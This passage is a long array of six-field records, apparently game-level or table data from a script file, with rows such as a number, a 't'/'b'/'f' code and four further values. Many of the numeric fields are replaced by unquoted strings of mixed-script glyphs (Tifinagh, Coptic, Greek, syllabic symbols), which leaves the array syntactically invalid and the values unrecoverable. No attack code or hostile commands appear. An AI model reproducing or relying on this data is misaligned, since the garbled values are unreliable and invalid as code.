			[1, "t", 4, 89, 301, 0],
			[ⵠΔΔ, "t", ᐃⲆᐃ, 88, 302, ᐃⵠⲆ],
			[ⵠⲆΔ, "t", ⲆⲆΔᐃ, 88, 301, Δⵠᐃ],
			[ΔⲆⵠ, "t", ΔⲆΔᐃ, 87, 302, 0],
			[ⵠⲆΔ, "t", ⲆⵠΔⵠ, 87, 299, ᐃⵠΔ],
			[ΔⲆⵠ, "t", ᐃⵠⵠΔ, 86, 302, 0],
			[ⵠΔᐃ, "t", 1, 85, 302, ᐃΔΔ],
			[1, "t", ᐃΔΔΔ, 85, 301, 0],
			[ⵠΔⲆ, "b", ΔⵠᐃⲆ, 84, 302, ᐃΔΔ],
			[1, "t", ⵠᐃΔⵠ, 83, 302, 0],
			[1, "t", ⵠΔΔ, 82, 302, ᐃⵠΔ],
			[ᐃᐃⵠ, "t", ᐃΔΔⲆ, 81, 302, 0],
			[ⵠΔⲆ, "t", ᐃⲆⵠᐃ, 80, 302, 0],
			[Ⲇᐃⵠ, "t", 4, 79, 302, 0],
			[Ⲇᐃⵠ, "t", 2, 78, 302, 0],
			[ᐃᐃⵠ, "b", 1, 77, 302, 0],
			[ⵠⲆΔ, "b", 2, 76, 302, ᐃⵠⲆ],
			[ᐃᐃⵠ, "t", ⵠⵠΔⲆ, 75, 302, 0],
			[ΔⲆⵠ, "t", ⲆΔⵠᐃ, 74, 302, ⵠⲆⲆ],
			[1, "b", 1, 73, 302, 0],
			[ᐃⲆᐃ, "t", ΔⵠᐃⲆ, 72, 302, ⲆΔⵠ],
			[1, "t", Ⲇᐃⵠᐃ, 71, 302, 0],
			[ᐃᐃⵠ, "b", 3, 70, 302, ᐃⵠΔ],
			[1, "t", 1, 69, 302, 0],
			[1, "t", 2, 68, 302, ᐃⵠⲆ],
			[1, "t", 5, 67, 302, 0],
			[1, "b", 1, 66, 302, ᐃⵠⲆ],
			[1, "t", ᐃⲆⵠᐃ, 65, 302, ΔΔⵠ],
			[ΔⲆⵠ, "t", ⲆΔⵠᐃ, 64, 302, 0],
			[1, "b", ⵠⵠⵠᐃ, 63, 302, ᐃΔΔ],
			[1, "t", 5, 62, 302, ΔΔⵠ],
			[1, "b", ᐃⲆᐃ, 61, 302, 0],
			[1, "t", ΔⲆᐃⲆ, 60, 302, ⵠⲆⲆ],
			[ΔⲆⵠ, "t", ⵠᐃᐃⲆ, 59, 302, ᐃⵠⲆ],
			[ΔⲆⵠ, "b", 2, 58, 302, 0],
			[ⵠⲆΔ, "t", ΔⵠⲆⲆ, 57, 302, ⲆΔⵠ],
			[ⵠΔⲆ, "t", 1, 56, 302, Δⵠᐃ],
			[1, "t", 3, 55, 302, 0],
			[1, "t", Ⲇⵠⵠⵠ, 54, 302, 0],
			[1, "t", ᐃⲆᐃ, 53, 302, ⵠⲆⲆ],
			[ⵠⲆΔ, "t", ⵠⵠΔΔ, 52, 302, 0],
			[ⵠΔΔ, "t", 2, 51, 302, 0],
			[Ⲇᐃⵠ, "t", 4, 50, 302, ⲆΔⵠ],
			[1, "t", ᐃⲆⵠᐃ, 49, 302, 0],
			[1, "b", 1, 48, 302, ⵠⲆⲆ],
			[ⵠΔΔ, "t", 3, 47, 302, ΔⲆⲆ],
			[ΔⲆⵠ, "t", ⲆⲆⲆΔ, 46, 302, ᐃⵠⲆ],
			[1, "t", ⵠΔᐃ, 45, 302, 0],
			[ⵠΔⲆ, "t", ᐃⲆⵠᐃ, 44, 302, ΔⲆⲆ],
			[Ⲇᐃⵠ, "t", 5, 43, 302, ᐃΔΔ],
			[1, "t", ΔⵠᐃⲆ, 42, 302, ᐃΔΔ],
			[ⵠⲆΔ, "t", 1, 41, 302, 0],
			[1, "t", 4, 40, 302, ᐃⵠⲆ],
			[ⵠΔⲆ, "b", 2, 39, 302, 0],
			[1, "t", ᐃⲆⵠⵠ, 38, 302, ᐃⵠΔ],
			[ⵠΔᐃ, "t", ΔⲆⵠ, 37, 302, 0],
			[1, "t", ⵠⵠⵠΔ, 36, 302, 0],
			[1, "t", 5, 35, 302, 0],
			[ΔΔΔ, "t", 0, 34, 302, 0],
			[ⵠΔΔ, "t", ⲆᐃΔᐃ, 33, 302, 0],
			[Ⲇᐃⵠ, "t", 4, 32, 302, 0],
			[ᐃᐃⵠ, "b", 1, 31, 302, ᐃⵠⲆ],
			[1, "t", ⲆⲆΔᐃ, 30, 302, 0],
			[1, "t", ᐃⵠⵠΔ, 29, 302, 0],
			[ΔⲆⵠ, "t", ᐃⲆⵠᐃ, 28, 302, 0],
			[1, "t", ΔΔᐃⲆ, 27, 302, ⵠⲆⲆ],
			[ⵠΔⲆ, "b", ᐃⲆᐃᐃ, 26, 302, ᐃⵠⲆ],
			[ΔⲆⵠ, "t", ᐃᐃⵠ, 25, 302, ⲆΔⵠ],
			[ᐃⲆᐃ, "t", 4, 24, 302, 0],
			[ⵠⲆΔ, "t", 2, 23, 302, 0],
			[1, "t", 1, 22, 302, 0],
			[ⵠΔᐃ, "t", 5, 21, 302, 0],
			[1, "t", ⲆᐃᐃⲆ, ⲆⵠᐃᐃⲆ, 302, ΔΔⵠ],
			[ⵠⲆΔ, "t", ᐃⵠⵠΔ, ΔⲆⲆⲆⵠ, 302, ΔⲆⲆ],
			[ΔΔΔ, "b", ᐃᐃⵠ, 18, 302, ᐃⵠΔ],
			[1, "t", ⵠᐃΔⵠ, ΔΔⲆΔᐃᐃᐃ, 302, ᐃΔΔ],
			[ⵠΔΔ, "t", ΔⲆΔᐃ, 16, 302, ᐃΔΔ],
			[ⵠΔᐃ, "t", 1, 15, 302, 0],
			[ⵠΔⲆ, "t", 5, 14, 302, 0],
			[ⵠΔⲆ, "t", 3, ⲆᐃᐃΔΔⵠⲆ, 302, ΔΔⵠ],
			[ⵠΔΔ, "t", ⲆΔⵠᐃ, 12, 302, 0],
			[1, "t", 1, 11, 302, Δⵠᐃ],
			[ᐃⲆᐃ, "t", 2, 10, 302, ᐃⵠΔ],
			[1, "t", 4, ⵠⲆⲆΔᐃ, 302, 0],
			[1, "b", ᐃⲆᐃᐃ, 8, 302, ᐃⵠⲆ],
			[1, "t", ᐃⲆⵠⵠ, ⲆⲆᐃⵠΔ, 302, ⲆΔⵠ],
			[ⵠΔⲆ, "t", ΔⵠⲆⲆ, 7, 302, ⵠⲆⲆ],
			[1, "b", 2, ᐃⲆⲆⲆ, 302, 0],
			[1, "t", 1, 6, 301, ᐃⵠΔ],
			[ⵠΔΔ, "t", 4, ⵠᐃᐃΔ, 300, 0],
			[1, "t", ΔⵠᐃⲆ, ⵠᐃᐃΔ, 299, 0],
			[1, "b", ΔⲆⲆ, ΔᐃⲆᐃ, 298, ⵠⲆⲆ],
			[ΔⲆⵠ, "t", 5, ⲆᐃⲆᐃ, 297, ⵠⲆⲆ],
			[1, "t", 2, 6, 296, Δⵠᐃ],
			[ᐃⲆᐃ, "t", 0, ⵠⵠⵠⲆⲆ, 295, 0],
			[1, "b", ⲆᐃᐃⲆ, 6, 294, 0],
			[1, "t", 5, ⵠᐃΔⵠⲆ, 293, 0],
			[1, "t", ᐃᐃⵠ, ⵠᐃᐃΔ, 292, 0],
			[ⵠΔΔ, "b", Δⵠᐃ, ⵠᐃᐃΔ, 291, 0],
			[1, "t", 2, 6, 290, ᐃⵠΔ],
			[1, "t", 5, 6, 289, 0],
			[ᐃᐃⵠ, "t", 1, 6, 288, 0],
			[ⵠΔᐃ, "t", ⵠᐃΔΔ, ⵠⵠⵠⲆⲆ, 287, ⵠⲆⲆ],
			[1, "t", ΔⵠᐃⲆ, ΔᐃⲆᐃ, 286, ᐃΔΔ],
			[1, "t", 5, ⵠⵠⵠⲆⲆ, 285, ᐃⵠΔ],
			[ⵠΔᐃ, "t", 2, 6, 284, 0],
			[1, "b", ᐃΔΔ, ΔᐃⲆᐃ, 283, ΔΔⵠ],
			[1, "t", ᐃⲆⵠᐃ, ⲆΔᐃΔⵠ, 282, ⲆΔⵠ],
			[ᐃᐃⵠ, "t", ᐃⲆⵠⵠ, 6, 281, ᐃⵠⲆ],
			[Ⲇᐃⵠ, "b", 2, 6, 280, ⲆΔⵠ],
			[ⵠΔᐃ, "t", ⵠᐃΔⵠ, ΔᐃⲆᐃ, 279, 0],
			[1, "t", ⵠΔⲆ, ⲆΔᐃΔⵠ, 278, Δⵠᐃ],
			[1, "t", ⵠⲆⵠᐃ, ⲆΔᐃΔⵠ, 277, ᐃⵠⲆ],
			[1, "t", ᐃᐃⲆⲆ, 6, 276, 0],
			[1, "t", ⲆΔΔᐃ, 6, 275, 0],
			[ΔⲆⵠ, "b", ᐃⵠⲆ, ⵠΔᐃΔⲆ, 274, ᐃΔΔ],
			[ⵠΔᐃ, "t", 5, ⲆᐃⲆᐃ, 273, 0],
			[Ⲇᐃⵠ, "t", ᐃⲆᐃ, ⵠⵠⵠⲆⲆ, 272, 0],
			[1, "t", ⵠᐃΔΔ, 6, 271, 0],
			[1, "b", ⲆΔⵠⵠ, ⲆΔᐃΔⵠ, 270, 0],
			[1, "t", ᐃⲆⵠⵠ, 6, 269, ΔΔⵠ],
			[1, "t", 1, ⵠΔᐃΔⲆ, 268, ΔΔⵠ],
			[1, "t", 4, ⵠᐃΔⵠⲆ, 267, ᐃⵠⲆ],
			[1, "t", 1, ⵠΔⵠᐃⵠ, 266, 0],
			[Ⲇᐃⵠ, "t", ΔⲆΔᐃ, ⵠΔⵠᐃⵠ, 265, 0],
			[ᐃⲆᐃ, "t", Ⲇᐃⵠᐃ, ⲆᐃⲆᐃ, 264, 0],
			[ᐃⲆᐃ, "b", 2, 6, 263, ⲆΔⵠ],
			[ᐃᐃⵠ, "t", ⲆΔΔᐃ, ⵠᐃΔⵠⲆ, 262, 0],
			[1, "t", 3, ⲆᐃⲆᐃ, 261, 0],
			[ⵠΔᐃ, "t", ᐃⵠΔ, 6, 260, Δⵠᐃ],
			[1, "t", ᐃΔΔΔ, ⵠΔⵠᐃⵠ, 259, 0],
			[1, "t", 1, 6, 258, ᐃⵠⲆ],
			[ᐃⲆᐃ, "t", ΔⲆΔᐃ, 6, 257, 0],
			[1, "t", 4, 6, 255, 0],
			[1, "t", ⲆΔⵠⵠ, 6, 254, Δⵠᐃ],
			[ΔⲆⵠ, "t", ⵠᐃΔⵠ, 6, 253, 0],
			[Ⲇᐃⵠ, "b", 2, ⵠΔᐃΔⲆ, 252, ΔⲆⲆ],
			[1, "t", ᐃⲆⵠⵠ, ⵠⵠⵠⲆⲆ, 251, ᐃⵠΔ],
			[ⵠΔᐃ, "t", 1, ⵠᐃᐃΔ, 250, 0],
			[ⵠΔⲆ, "t", 3, ⵠΔⵠᐃⵠ, 249, ᐃⵠΔ],
			[1, "t", 4, ⵠΔᐃΔⲆ, 248, 0],
			[1, "b", 3, 6, 247, ᐃⵠⲆ],
			[ⵠΔΔ, "t", 5, 6, 246, ΔΔⵠ],
			[ⵠΔΔ, "t", ΔⲆᐃⲆ, ᐃⲆⲆⲆ, 245, 0],
			[1, "t", ᐃΔΔΔ, 6, 244, ᐃΔΔ],
			[ΔⲆⵠ, "t", ⵠⲆⲆ, 6, 243, ⵠⲆⲆ],
			[Ⲇᐃⵠ, "t", ⵠΔᐃΔ, ᐃⲆⲆⲆ, 242, 0],
			[ⵠΔΔ, "t", ᐃⲆΔⵠ, ⵠᐃΔⵠᐃ, 241, ΔⲆⲆ],
			[1, "t", 5, ΔᐃⲆᐃ, 240, 0],
			[ⵠΔΔ, "b", ⵠⲆⲆ, ⵠᐃᐃΔ, 239, ΔⲆⲆ],
			[ⵠΔΔ, "t", 3, 6, 238, ᐃⵠΔ],
			[1, "t", 4, ⵠΔᐃΔⲆ, 237, ⵠⲆⲆ],
			[ᐃⲆᐃ, "t", ⵠⲆΔ, ⲆᐃⲆᐃ, 236, Δⵠᐃ],
			[1, "t", ᐃΔΔΔ, 6, 235, 0],
			[ᐃᐃⵠ, "b", 2, 6, 234, 0],
			[1, "t", 2, 6, 233, 0],
			[ᐃⲆᐃ, "t", 4, 6, 232, 0],
			[1, "b", 3, 6, 231, ΔⲆⲆ],
			[ᐃᐃⵠ, "t", 5, 6, 230, 0],
			[1, "t", ΔⲆⵠ, 6, 229, Δⵠᐃ],
			[ⵠΔⲆ, "t", ⲆᐃᐃⲆ, 6, 228, 0],
			[ⵠΔⲆ, "t", 5, 6, 227, 0],
			[ⵠΔⲆ, "b", ᐃⲆⵠᐃ, 6, 226, ᐃⵠⲆ],
			[ⵠⲆΔ, "t", ᐃⵠⵠΔ, 6, 225, ᐃΔΔ],
			[1, "t", Δⵠᐃ, ⲆᐃⲆᐃ, 224, ᐃⵠΔ],
			[ⵠΔᐃ, "t", 2, 6, 223, 0],
			[Ⲇᐃⵠ, "t", 0, ᐃⲆⲆⲆ, 222, 0],
			[1, "b", ⲆⲆΔᐃ, ⲆᐃⲆᐃ, 221, ᐃⵠΔ],
			[ΔⲆⵠ, "t", 4, 6, 220, ⲆΔⵠ],
			[ⵠΔᐃ, "b", ᐃⲆᐃᐃ, ⲆᐃⲆᐃ, 219, ⲆΔⵠ],
			[1, "t", 5, 6, 218, ΔⲆⲆ],
			[1, "t", 0, 6, 217, ᐃⵠⲆ],
			[ᐃⲆᐃ, "t", ᐃⲆΔⵠ, 6, 216, ᐃⵠⲆ],
			[ⵠⲆΔ, "b", 0, 6, 215, ᐃⵠⲆ],
			[1, "t", ⵠⲆⵠᐃ, ΔᐃⲆᐃ, 214, 0],
			[ᐃⲆᐃ, "t", ⲆᐃᐃⲆ, 6, 213, 0],
			[ᐃⲆᐃ, "t", 0, 6, 212, ᐃⵠΔ],
			[Ⲇᐃⵠ, "t", ⲆᐃᐃⲆ, ᐃⲆⲆⲆ, 211, ᐃΔΔ],
			[ᐃᐃⵠ, "b", ΔⲆᐃⲆ, ⵠᐃΔⵠᐃ, 210, ᐃⵠⲆ],
			[ⵠΔᐃ, "t", 0, 6, 209, ΔⲆⲆ],
			[1, "t", 5, 6, 207, 0],
			[ⵠΔⲆ, "t", ⵠⵠⵠΔ, 6, 208, ᐃⵠⲆ],
			[1, "t", ᐃⵠΔ, 6, 206, 0],
			[1, "t", 2, ⵠⵠⵠⲆⲆ, 205, 0],
			[ⵠΔⲆ, "t", ΔⵠᐃⲆ, 6, 203, ΔⲆⲆ],
			[1, "b", 0, 6, 202, 0],
			[ⵠΔΔ, "t", 3, ⵠᐃΔⵠᐃ, 201, ᐃⵠⲆ],
			[1, "t", 4, 6, 199, ᐃⵠⲆ],
			[ⵠⲆΔ, "t", ᐃΔΔ, ⵠᐃᐃΔ, 198, ᐃⵠⲆ],
			[1, "t", ⵠⵠΔⲆ, 6, 197, ΔⲆⲆ],
			[1, "t", ⲆⵠΔⵠ, 6, 196, ΔΔⵠ],
			[ⵠΔᐃ, "t", Ⲇᐃⵠ, ⵠᐃᐃΔ, 195, 0],
			[1, "t", 3, 6, 194, Δⵠᐃ],
			[1, "t", 4, ᐃⲆⲆⲆ, 192, Δⵠᐃ],
			[1, "t", 2, ᐃⲆⲆⲆ, 191, ⵠⲆⲆ],
			[1, "b", ΔⲆⲆ, ⵠᐃᐃΔ, 190, 0],
			[ᐃⲆᐃ, "t", ᐃⲆᐃᐃ, ⲆᐃⲆᐃ, 189, ⵠⲆⲆ],
			[1, "t", 4, 6, 187, ⵠⲆⲆ],
			[1, "b", 0, 6, 186, ΔΔⵠ],
			[1, "t", 2, ⵠΔᐃΔⲆ, 185, Δⵠᐃ],
			[1, "t", 4, 6, 184, ᐃΔΔ],
			[1, "t", 2, 6, 183, 0],
			[ⵠΔⲆ, "t", Δⵠᐃ, ⲆΔᐃΔⵠ, 182, 0],
			[ⵠΔᐃ, "b", ⵠⵠⵠΔ, ⵠΔⵠᐃⵠ, 181, ᐃΔΔ],
			[1, "t", 5, ⵠⵠⵠⲆⲆ, 180, 0],
			[ⵠΔΔ, "t", 2, ⵠΔⵠᐃⵠ, 179, 0],
			[ᐃⲆᐃ, "t", ᐃⵠⲆ, 6, 178, Δⵠᐃ],
			[1, "t", ⵠⵠⵠΔ, ⲆΔᐃΔⵠ, 177, 0],
			[1, "t", ⵠᐃᐃⲆ, 6, 176, 0],
			[ⵠΔΔ, "b", 2, ΔᐃⲆᐃ, 175, ΔⲆⲆ],
			[1, "t", ΔΔΔ, ⵠⵠⵠⲆⲆ, 174, ⲆΔⵠ],
			[ᐃⲆᐃ, "t", 5, 6, 173, 0],
			[1, "t", ⵠⵠⵠΔ, 6, 256, 0],
			[Ⲇᐃⵠ, "t", Ⲇⵠⵠⵠ, 6, 204, ΔⲆⲆ],
			[1, "t", ᐃⵠⵠΔ, 6, 200, 0],
			[1, "t", 2, ⲆᐃⲆᐃ, 193, ᐃⵠΔ],
			[ΔΔΔ, "t", 2, 6, 188, ΔΔⵠ],
			[1, "f", 1, ᐃⲆⲆⲆ, 150, 1],
			[ΔΔΔ, "f", ⵠⵠΔⲆ, 6, 151, 1],
			[ᐃⲆᐃ, "f", 2, ΔᐃⲆᐃ, 149, ⵠΔⲆ],
			[Ⲇᐃⵠ, "f", ⵠΔΔ, 6, 148, 1],
			[1, "f", ⲆᐃᐃⲆ, ⵠᐃᐃΔ, 147, ᐃⲆᐃ],
			[1, "f", ᐃⲆΔⲆ, 6, 145, 1],
			[ΔⲆⵠ, "f", ⲆᐃᐃⲆ, 6, 143, 1],
			[1, "f", 1, 6, 146, 1],
			[ⵠΔⲆ, "f", 1, ⲆΔᐃΔⵠ, 144, ⵠΔᐃ],
			[1, "f", ΔⲆⵠ, ⵠᐃΔⵠᐃ, 142, 1],
			[1, "f", 2, 6, 141, 1],
			[ΔⲆⵠ, "f", ⲆⲆΔᐃ, ΔᐃⲆᐃ, 139, 1],
			[1, "f", ΔⵠᐃⲆ, ⲆΔᐃΔⵠ, 137, 1],
			[1, "f", 2, ⲆᐃⲆᐃ, 135, 1],
			[ΔⲆⵠ, "f", ⵠⵠΔⲆ, ⲆΔᐃΔⵠ, 133, 1],
			[1, "f", 1, 6, 140, 1],
			[ⵠΔⲆ, "f", Ⲇᐃⵠ, ⵠⵠⵠⲆⲆ, 138, 1],
			[1, "f", 1, ⲆᐃⲆᐃ, 136, 1],
			[1, "f", 1, 6, 134, 1],
			[1, "f", ⵠΔΔ, ᐃⲆⲆⲆ, 132, ⵠΔⲆ],
			[1, "f", ΔⵠᐃⲆ, ⵠᐃΔⵠᐃ, 131, ⵠΔᐃ],
			[Ⲇᐃⵠ, "f", ⵠⵠΔⲆ, ⵠΔⵠᐃⵠ, 129, ΔⲆⵠ],
			[Ⲇᐃⵠ, "f", 2, ⵠᐃΔⵠᐃ, 127, ⵠΔⲆ],
			[ⵠΔⲆ, "f", ⲆⲆΔᐃ, ⵠᐃΔⵠᐃ, 125, ᐃⲆᐃ],
			[1, "f", ⵠⵠΔⲆ, 6, 123, 1],
			[1, "f", ⵠⵠΔⲆ, ⲆΔᐃΔⵠ, 121, 1],
			[ΔⲆⵠ, "f", 1, 6, 130, 1],
			[1, "f", ΔΔΔ, 6, 128, ⵠΔΔ],
			[Ⲇᐃⵠ, "f", 1, 6, 126, ΔΔΔ],
			[ΔⲆⵠ, "f", ⵠΔΔ, ⵠᐃΔⵠⲆ, 124, ᐃᐃⵠ],
			[1, "f", Ⲇᐃⵠ, ᐃⲆⲆⲆ, 122, ⵠⲆΔ],
			[1, "f", Ⲇᐃⵠ, 6, 120, Ⲇᐃⵠ],
			[ⵠΔᐃ, "f", ⲆᐃᐃⲆ, 6, 119, ⵠΔᐃ],
			[1, "f", 2, ᐃⲆⲆⲆ, 117, 1],
			[1, "f", 2, ⵠᐃΔⵠⲆ, 115, ΔⲆⵠ],
			[1, "f", ΔⵠᐃⲆ, ⵠᐃᐃΔ, 113, ⵠΔᐃ],
			[1, "f", 2, ΔᐃⲆᐃ, 111, 1],
			[1, "f", 2, ᐃⲆⲆⲆ, 109, ⵠΔⲆ],
			[1, "f", 1, ⵠⵠⵠⲆⲆ, 118, ΔΔΔ],
			[ΔⲆⵠ, "f", 1, ⲆᐃⲆᐃ, 116, 1],
			[ᐃᐃⵠ, "f", ᐃᐃⵠ, ⵠᐃᐃΔ, 114, 1],
			[1, "f", 1, 6, 112, 1],
			[Ⲇᐃⵠ, "f", ⵠⲆΔ, ⵠⵠⵠⲆⲆ, 110, 1],
			[Ⲇᐃⵠ, "f", ⵠΔⲆ, 6, 108, 1],
			[Ⲇᐃⵠ, "f", 1, 6, 106, ⵠⲆΔ],
			[ⵠΔᐃ, "f", ⵠⲆΔ, ⵠΔᐃΔⲆ, 104, ᐃⲆᐃ],
			[ΔΔΔ, "f", 2, ΔᐃⲆᐃ, 107, 1],
			[1, "f", 2, ⲆᐃⲆᐃ, 105, ΔⲆⵠ],
			[1, "f", 2, 6, 103, 1],
			[1, "f", ΔⵠᐃⲆ, ᐃⲆⲆⲆ, 101, ΔΔΔ],
			[1, "f", 2, ᐃⲆⲆⲆ, 99, 1],
			[ᐃᐃⵠ, "f", ⵠⵠⵠΔ, 6, 97, ⵠΔᐃ],
			[ⵠΔΔ, "f", 2, 6, 95, 1],
			[ⵠΔΔ, "f", ΔⵠᐃⲆ, 6, 93, 1],
			[ⵠΔΔ, "f", 2, 6, 91, 1],
			[1, "f", 1, ΔᐃⲆᐃ, 102, ᐃᐃⵠ],
			[ⵠⲆΔ, "f", 1, ⵠΔⵠᐃⵠ, 100, 1],
			[ⵠΔᐃ, "f", 1, ᐃⲆⲆⲆ, 98, ⵠⲆΔ],
			[1, "f", 1, 6, 96, 1],
			[1, "f", 1, 6, 94, 1],
			[1, "f", 1, ⲆᐃⲆᐃ, 92, 1],
			[ⵠⲆΔ, "f", ᐃᐃⵠ, 6, 90, ⵠΔᐃ],
			[ⵠⲆΔ, "f", ⵠΔΔ, 6, 88, ΔⲆⵠ],
			[Ⲇᐃⵠ, "f", 1, ᐃⲆⲆⲆ, 86, ⵠΔⲆ],
			[1, "f", 2, ⵠᐃΔⵠⲆ, 89, ⵠΔᐃ],
			[1, "f", 2, ⵠᐃᐃΔ, 87, 1],
			[ⵠⲆΔ, "f", ⵠⵠΔⲆ, ⵠΔᐃΔⲆ, 85, 1],
			[ΔⲆⵠ, "f", ⲆⲆΔᐃ, ⲆᐃⲆᐃ, 83, 1],
			[1, "f", ΔⵠᐃⲆ, ΔᐃⲆᐃ, 81, 1],
			[1, "f", ᐃⲆⵠᐃ, ᐃⲆⲆⲆ, 79, 1],
			[ᐃⲆᐃ, "f", ⵠⵠⵠΔ, ⵠᐃΔⵠᐃ, 77, 1],
			[ᐃⲆᐃ, "f", ΔΔΔ, ⵠΔᐃΔⲆ, 84, 1],
			[1, "f", 1, ⲆΔᐃΔⵠ, 82, ΔΔΔ],
			[1, "f", 1, 6, 80, 1],
			[1, "f", ΔⲆⵠ, 6, 78, ᐃᐃⵠ],
			[1, "f", ᐃᐃⵠ, ᐃⲆⲆⲆ, 76, ᐃᐃⵠ],
			[ⵠⲆΔ, "f", ⲆⲆΔᐃ, ⵠΔᐃΔⲆ, 75, 1],
			[ΔⲆⵠ, "f", ᐃⲆⵠᐃ, ⵠᐃᐃΔ, 73, ᐃᐃⵠ],
			[ⵠⲆΔ, "f", ΔⵠᐃⲆ, ⵠΔⵠᐃⵠ, 71, 1],
			[Ⲇᐃⵠ, "f", ΔⵠᐃⲆ, 6, 69, 1],
			[ΔΔΔ, "f", ⲆᐃᐃⲆ, 6, 67, 1],
			[ⵠΔΔ, "f", 2, 6, 65, 1],
			[1, "f", 1, 6, 74, ⵠΔΔ],
			[ⵠΔⲆ, "f", Ⲇᐃⵠ, ⵠⵠⵠⲆⲆ, 72, 1],
			[ΔⲆⵠ, "f", 1, ⲆΔᐃΔⵠ, 70, 1],
			[1, "f", ⵠⲆΔ, 6, 68, ⵠΔⲆ],
			[ΔⲆⵠ, "f", ΔⲆⵠ, ⵠᐃᐃΔ, 66, 1],
			[1, "f", ΔΔΔ, ᐃⲆⲆⲆ, 64, ⵠΔⲆ],
			[ΔΔΔ, "f", 2, 6, 63, ⵠⲆΔ],
			[1, "f", ⵠⵠⵠΔ, 6, 61, ΔⲆⵠ],
			[1, "f", 2, ⵠᐃΔⵠᐃ, 59, 1],
			[1, "f", ⵠⵠⵠΔ, ⲆΔᐃΔⵠ, 57, ΔⲆⵠ],
			[ⵠΔⲆ, "f", ᐃⲆⵠᐃ, 6, 55, 1],
			[ΔⲆⵠ, "f", 2, ΔᐃⲆᐃ, 53, ⵠΔⲆ],
			[1, "f", ᐃⲆΔⲆ, 6, 51, ⵠⲆΔ],
			[ⵠⲆΔ, "f", 1, ⵠⵠⵠⲆⲆ, 62, ⵠΔᐃ],
			[1, "f", 1, 6, 60, 1],
			[ΔⲆⵠ, "f", 1, ⵠⵠⵠⲆⲆ, 58, 1],
			[ⵠΔΔ, "f", ΔⲆⵠ, 6, 56, Ⲇᐃⵠ],
			[ⵠΔᐃ, "f", ⵠΔΔ, ⵠΔᐃΔⲆ, 54, ⵠΔᐃ],
			[ⵠΔΔ, "f", 1, ⵠΔⵠᐃⵠ, 52, 1],
			[1, "f", ⵠΔᐃ, ⵠΔⵠᐃⵠ, 50, 1],
			[1, "f", ΔⵠᐃⲆ, 6, 49, ⵠΔⲆ],
			[1, "f", 2, ⵠΔᐃΔⲆ, 47, 1],
			[1, "f", ⵠⵠⵠΔ, ⲆᐃⲆᐃ, 45, 1],
			[1, "f", 2, ⵠᐃΔⵠᐃ, 43, 1],
			[ΔⲆⵠ, "f", ⵠⵠΔⲆ, 6, 41, 1],
			[1, "f", 2, ⵠΔᐃΔⲆ, 39, Ⲇᐃⵠ],
			[ⵠΔᐃ, "f", 1, ΔᐃⲆᐃ, 48, ⵠΔΔ],
			[ΔΔΔ, "f", 1, 6, 46, Ⲇᐃⵠ],
			[1, "f", ᐃᐃⵠ, ⵠΔⵠᐃⵠ, 44, 1],
			[ⵠΔΔ, "f", Ⲇᐃⵠ, 6, 42, ᐃⲆᐃ],
			[1, "f", Ⲇᐃⵠ, 6, 40, ⵠⲆΔ],
			[1, "f", ⵠΔᐃ, 6, 38, 1],
			[1, "f", ⵠⵠⵠΔ, ⵠᐃΔⵠᐃ, 37, ΔΔΔ],
			[ᐃⲆᐃ, "f", ⲆᐃᐃⲆ, ⵠΔⵠᐃⵠ, 35, 1],
			[1, "f", 2, ΔᐃⲆᐃ, 33, 1],
			[ⵠΔᐃ, "f", 2, 6, 31, ΔΔΔ],
			[1, "f", ⵠⵠⵠΔ, ΔᐃⲆᐃ, 29, 1],
			[1, "f", 2, ⵠᐃᐃΔ, 27, 1],
			[ΔΔΔ, "f", ΔΔΔ, ⲆᐃⲆᐃ, 36, Ⲇᐃⵠ],
			[Ⲇᐃⵠ, "f", 1, 6, 34, 1],
			[ᐃⲆᐃ, "f", ⵠΔΔ, ⵠΔᐃΔⲆ, 32, Ⲇᐃⵠ],
			[1, "f", 1, ⲆΔᐃΔⵠ, 30, 1],
			[ⵠⲆΔ, "f", ᐃⲆᐃ, 6, 28, ⵠΔᐃ],
			[ΔΔΔ, "f", ΔΔΔ, ⵠᐃΔⵠᐃ, 26, ⵠΔΔ],
			[1, "f", 2, ᐃⲆⲆⲆ, 25, ⵠΔⲆ],
			[ᐃⲆᐃ, "f", ᐃⲆⵠᐃ, 6, 23, ⵠⲆΔ],
			[1, "f", 2, 6, 21, 1],
			[ⵠΔΔ, "f", ᐃⲆⵠᐃ, 6, ᐃΔⲆΔⵠ, 1],
			[1, "f", ⵠⵠⵠΔ, ⵠᐃᐃΔ, 17, 1],
			[ⵠΔᐃ, "f", 2, ⵠΔᐃΔⲆ, ⲆΔΔⵠⲆ, ΔΔΔ],
			[1, "f", ⵠΔΔ, ⵠⵠⵠⲆⲆ, 24, ⵠⲆΔ],
			[ⵠΔⲆ, "f", 1, ᐃⲆⲆⲆ, 22, ⵠΔⲆ],
			[ΔⲆⵠ, "f", 1, ⵠᐃΔⵠᐃ, 20, ⵠΔΔ],
			[1, "f", ΔⲆⵠ, 6, 18, 1],
			[Ⲇᐃⵠ, "f", 1, 6, ⲆⲆⲆΔΔ, 1],
			[ⵠΔⲆ, "f", 2, ⵠᐃΔⵠᐃ, 13, 1],
			[ⵠΔΔ, "f", ⲆⲆΔᐃ, 6, ΔⵠⲆⵠᐃᐃΔ, ᐃⲆᐃ],
			[ⵠΔᐃ, "f", ᐃⲆΔⲆ, ⲆᐃⲆᐃ, ⲆΔⵠᐃΔ, ᐃⲆᐃ],
			[ΔΔΔ, "f", 2, ΔᐃⲆᐃ, 7, ⵠⲆΔ],
			[ΔΔΔ, "f", Ⲇᐃⵠ, ᐃⲆⲆⲆ, 14, 1],
			[Ⲇᐃⵠ, "f", ⵠⲆΔ, ⲆᐃⲆᐃ, ⲆΔⲆⲆᐃ, ⵠΔᐃ],
			[1, "f", Ⲇᐃⵠ, ⵠΔᐃΔⲆ, 10, 1],
			[1, "f", 1, 6, ΔᐃΔⲆⲆ, 1],
			[ΔΔΔ, "f", ⵠΔΔ, 6, ⵠⵠⵠⲆⲆ, ⵠΔᐃ],
			[ⵠⲆΔ, "f", ⵠⲆΔ, 8, 6, 1],
			[ΔⲆⵠ, "f", ⵠⵠⵠΔ, 7, 6, 1],
			[ᐃⲆᐃ, "f", 2, 9, ᐃⲆⲆⲆ, ⵠΔⲆ],
			[Ⲇᐃⵠ, "f", 2, ΔⲆⲆᐃᐃ, ᐃⲆⲆⲆ, 1],
			[Ⲇᐃⵠ, "f", ⲆᐃᐃⲆ, Δⵠᐃⵠⵠ, ⵠⵠⵠⲆⲆ, ᐃᐃⵠ],
			[ⵠⲆΔ, "f", ⵠⵠⵠΔ, ΔⵠΔᐃⵠ, ⵠΔᐃΔⲆ, 1],
